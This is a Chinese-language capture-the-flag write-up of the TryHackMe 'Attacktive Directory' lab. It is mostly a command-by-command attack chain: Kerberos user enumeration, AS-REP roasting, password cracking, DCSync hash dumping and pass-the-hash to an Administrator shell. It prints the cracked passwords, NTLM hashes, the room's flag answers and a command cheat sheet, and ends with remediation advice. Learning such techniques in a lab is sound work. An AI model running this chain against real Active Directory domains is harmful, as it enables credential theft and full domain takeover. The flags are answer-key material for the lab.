# THM 10.48.182.15 渗透测试 Writeup

**日期**: 2026-06-03
**测试者**: yao
**目标**: 10.48.182.15
**平台**: TryHackMe 授权靶场 (Attacktive Directory)
**耗时**: ~120 分钟
**状态**: ✅ 全部完成 (3/3 Flags)

---

## 1. 信息搜集

### 1.1 端口扫描

```bash
nmap -sC -sV 10.48.182.15
```

**结果**：14 个端口开放
| 端口     | 服务     | 版本                                       |
| -------- | -------- | ------------------------------------------ |
| 53/tcp   | DNS      | Microsoft DNS                              |
| 80/tcp   | HTTP     | Microsoft IIS 10.0                         |
| 88/tcp   | Kerberos | Microsoft Windows Kerberos                 |
| 135/tcp  | RPC      | Microsoft Windows RPC                      |
| 139/tcp  | NetBIOS  | Microsoft Windows netbios-ssn              |
| 389/tcp  | LDAP     | Microsoft Windows AD LDAP                  |
| 445/tcp  | SMB      | Microsoft-DS                               |
| 464/tcp  | kpasswd  | Kerberos Password Change                   |
| 593/tcp  | RPC      | Microsoft Windows RPC over HTTP 1.0        |
| 636/tcp  | LDAPS    | SSL/TLS wrapped LDAP                       |
| 3268/tcp | LDAP GC  | Microsoft Windows AD LDAP (Global Catalog) |
| 3269/tcp | LDAPS GC | SSL/TLS wrapped LDAP GC                    |
| 3389/tcp | RDP      | Microsoft Terminal Services                |
| 5985/tcp | WinRM    | Microsoft HTTPAPI httpd 2.0                |

### 1.2 系统信息
- **OS**: Windows Server 2019 (Build 17763)
- **域名**: spookysec.local
- **计算机名**: AttacktiveDirectory.spookysec.local
- **NetBIOS**: THM-AD
- **SMB 签名**: 启用且必需

---

## 2. 用户枚举

### 2.1 Kerbrute 用户枚举

```bash
kerbrute userenum -d spookysec.local --dc 10.48.182.15 userlist.txt
```

**发现的用户**：
- administrator
- james / James / JAMES
- svc-admin
- robin / Robin
- darkstar
- backup
- paradox
- 其他用户

**关键发现**：svc-admin 账户设置了 "Does not require Pre-Authentication"

---

## 3. AS-REP Roasting

### 3.1 获取 svc-admin AS-REP hash

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -dc-ip 10.48.182.15 -no-pass
```

**获取 hash**：
```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...
```

### 3.2 John 破解密码

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt svc-admin.asrep
```

**结果**：
```
management2005
```

---

## 4. SMB 枚举与凭据发现

### 4.1 列出 SMB 共享

```bash
smbclient -L \\10.48.182.15 -U svc-admin%management2005
```

**发现 6 个共享**：
- ADMIN$
- backup
- C$
- IPC$
- NETLOGON
- SYSVOL

### 4.2 读取 backup 共享

```bash
smbclient //10.48.182.15/backup -U svc-admin%management2005 -c "get backup_credentials.txt /tmp/backup_credentials.txt"
```

**文件内容**（Base64 解码后）：
```
backup@spookysec.local:backup2517860
```

---

## 5. DCSync (DRSUAPI)

### 5.1 获取所有域用户 hash

```bash
crackmapexec smb 10.48.182.15 -u backup -p backup2517860 --ntds
```

**获取 18 个 NTDS hashes**，包括：

**Administrator**：

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

**krbtgt**：
```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
```

---

## 6. Pass-the-Hash 与权限提升

### 6.1 Evil-WinRM 登录

```bash
evil-winrm -i 10.48.182.15 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

**成功获取 Administrator 权限 shell**

### 6.2 读取所有 Flags

```powershell
cat C:\Users\svc-admin\Desktop\user.txt.txt
cat C:\Users\backup\Desktop\PrivEsc.txt
cat C:\Users\Administrator\Desktop\root.txt
```

**结果**：
| Flag             | 位置                  | 内容                               |
| ---------------- | --------------------- | ---------------------------------- |
| **user flag**    | svc-admin Desktop     | `TryHackMe{K3rb3r0s_Pr3_4uth}`     |
| **privesc flag** | backup Desktop        | `TryHackMe{B4ckM3UpSc0tty!}`       |
| **root flag**    | Administrator Desktop | `TryHackMe{4ctiveD1rectoryM4st3r}` |

---

## 7. 攻击路径总结

```
[信息搜集]
  └── Nmap 扫描 → 发现 14 个端口 (Windows AD DC)
      └── Kerbrute 枚举 → 发现 10+ 用户
          └── svc-admin (AS-REP roastable)
              └── AS-REP Roasting → 获取 hash
                  └── John 破解 → management2005
                      └── SMB 枚举 → backup 共享
                          └── backup_credentials.txt (base64)
                              └── backup:backup2517860
                                  └── DCSync (DRSUAPI) → 所有域 hash
                                      └── Administrator NTLM hash
                                          └── Pass-the-Hash → Evil-WinRM
                                              └── 获取所有 flags
```

---

## 8. 漏洞分析

### 8.1 漏洞列表

| 漏洞            | 风险等级 | 说明                                |
| --------------- | -------- | ----------------------------------- |
| AS-REP Roasting | 高       | svc-admin 不需要预认证，可获取 hash |
| SMB 凭据泄露    | 高       | backup 共享包含明文凭据文件         |
| DCSync 权限     | 高       | backup 账户拥有目录复制权限         |
| 密码复用        | 中       | 多个用户可能使用弱密码              |

### 8.2 修复建议

1. **禁用不需要预认证的用户**
   - 除非必要，否则不要设置 "Does not require Pre-Authentication"

2. **限制目录复制权限**
   - 仅 Domain Controllers 需要 "Replicating Directory Changes" 权限

3. **SMB 共享安全**
   - 不要在共享中存储明文凭据
   - 限制共享访问权限

4. **强密码策略**
   - 强制执行复杂密码
   - 定期更换密码

---

## 9. 技术细节

### 9.1 工具使用
- **Nmap**: 端口扫描
- **Kerbrute**: Kerberos 用户枚举
- **Impacket**: GetNPUsers, secretsdump, wmiexec, psexec
- **John**: AS-REP hash 破解
- **CrackMapExec**: DCSync 攻击
- **Evil-WinRM**: WinRM 远程管理
- **smbclient**: SMB 文件操作

### 9.2 关键命令速查
```bash
# Kerbrute 枚举
kerbrute userenum -d spookysec.local --dc 10.48.182.15 userlist.txt

# AS-REP Roasting
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -dc-ip 10.48.182.15 -no-pass

# John 破解
john --wordlist=/usr/share/wordlists/rockyou.txt svc-admin.asrep

# SMB 枚举
smbclient -L \\10.48.182.15 -U svc-admin%management2005

# DCSync
crackmapexec smb 10.48.182.15 -u backup -p backup2517860 --ntds

# Pass-the-Hash
evil-winrm -i 10.48.182.15 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

---

## 10. 时间线

| 时间  | 动作            | 结果                |
| ----- | --------------- | ------------------- |
| T+0m  | Nmap 扫描       | 发现 14 个端口      |
| T+20m | Kerbrute 枚举   | 发现 10+ 用户       |
| T+30m | AS-REP Roasting | 获取 svc-admin hash |
| T+40m | John 破解       | 密码 management2005 |
| T+50m | SMB 枚举        | 发现 backup 凭据    |
| T+60m | DCSync          | 获取所有域 hash     |
| T+70m | Pass-the-Hash   | Administrator 登录  |
| T+80m | 读取 Flags      | 获取 3 个 flags     |

---

## 11. 参考

- [Kerbrute](https://github.com/ropnop/kerbrute)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [THM Attacktive Directory](https://tryhackme.com/)

---

**文档状态**: ✅ 完成
**最后更新**: 2026-06-03